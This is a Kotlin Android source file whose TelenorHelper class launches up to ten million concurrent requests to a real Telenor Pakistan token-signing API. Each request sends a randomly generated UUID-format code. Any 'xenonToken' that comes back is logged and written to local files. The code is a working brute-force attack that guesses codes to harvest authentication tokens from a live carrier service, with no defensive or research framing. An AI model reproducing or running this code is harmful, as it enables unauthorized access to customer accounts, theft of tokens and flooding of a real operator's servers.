package com.test.presentation.telenor

import android.content.Context
import android.util.Log
import com.test.presentation.test.KtorHelper
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.Job
import kotlinx.coroutines.joinAll
import kotlinx.coroutines.launch
import kotlinx.coroutines.withContext
import kotlinx.serialization.Serializable
import java.io.File
import java.security.SecureRandom
import java.util.concurrent.ConcurrentHashMap


class TelenorHelper(
    private val context: Context
) {
    private val ktorHelper = KtorHelper()

    private val TAG = "FikerFreeHelper"

    fun main() {
        CoroutineScope(Dispatchers.IO).launch {
            Log.e("EasyFounded", "Started")
            loopThroughIt()
//            val uuid = UniqueUUIDGenerator.generateUUID()
//            val response = fetchAndVerify("f7411b1a-3e7e-3765-8a36-5bf4a8896be0")
//            Log.d(TAG, "main: $response")
        }
    }

    suspend fun doWork() {
        val uuid = UniqueUUIDGenerator.generateUUID()
        Log.d(TAG, "doWork: $uuid")
        val response = fetchAndVerify(uuid)
        if (response != null) {
            Log.e("EasyFounded", "$uuid Found:$response ")
            Log.e(TAG, "$uuid Found:$response ")
        } else {
            Log.d(TAG, "$uuid Not Found")
        }
        if (response != null) {
            createTextFile(
                context = context,
                fileName = "${uuid.take(4)}.txt",
                content = response
            )
        }
        Log.d(TAG, "main: $response")
    }

    private suspend fun loopThroughIt() {
        Log.d(TAG, "loopThroughIt: called")
        withContext(Dispatchers.IO) {
            val list = List(10000000) {
                it
            }
            val jobs = mutableListOf<Job>()
            list.forEach {
                jobs.add(launch {
                    doWork()
                })
            }
            jobs.joinAll()
            Log.e(TAG, "loopThroughIt: Done ")
        }
    }

    suspend fun fetchAndVerify(code: String): String? {
        return withContext(Dispatchers.IO) {
            val response = fetchXenon(code)
            if (response != null) {
                val model = try {
                    ktorHelper.getHelper().decodeFromString<TelenorResponse>(response)
                } catch (_: Exception) {
                    null
                }
                if (model != null) {
                    model.data?.xenonToken
                } else {
                    null
                }
            } else {
                null
            }
        }
    }

    private suspend fun createTextFile(context: Context, fileName: String, content: String) {
        withContext(Dispatchers.IO) {
            val file = File(context.filesDir, fileName)
            file.writeText(content)
        }
    }

    private suspend fun fetchXenon(code: String): String? {
        Log.d(TAG, "fetchXenon: Called")
        val response = ktorHelper.hitAndGetResponse(
            url = "https://theomancy.app.telenor.com.pk/api/v2/token/sign",
            headers = mapOf(
                "Content-Type" to "application/json"
            ),
            body = User(code)
        )
        Log.d(TAG, "fetchXenon: $response")
        return response
    }
}

@Serializable
data class User(
    val code: String
)


object UniqueUUIDGenerator {
    private val generatedUUIDs = ConcurrentHashMap.newKeySet<String>()
    private val random = SecureRandom()

    @Synchronized
    fun generateUUID(): String {
        while (true) {
            val uuid = buildUUID()
            if (generatedUUIDs.add(uuid)) {
                return uuid
            }
        }
    }

    private fun buildUUID(): String {
        return String.format(
            "%04x%04x-%04x-%04x-%04x-%04x%04x%04x",
            random.nextInt(0x10000), random.nextInt(0x10000),
            random.nextInt(0x10000),
            (0x3000 or (random.nextInt(0x1000))).toShort(), // Ensuring 3xxx format
            (0x8000 or (random.nextInt(0x4000))).toShort(), // Ensuring 8xxx, 9xxx, axxx, bxxx format
            random.nextInt(0x10000), random.nextInt(0x10000), random.nextInt(0x10000)
        )
    }
}
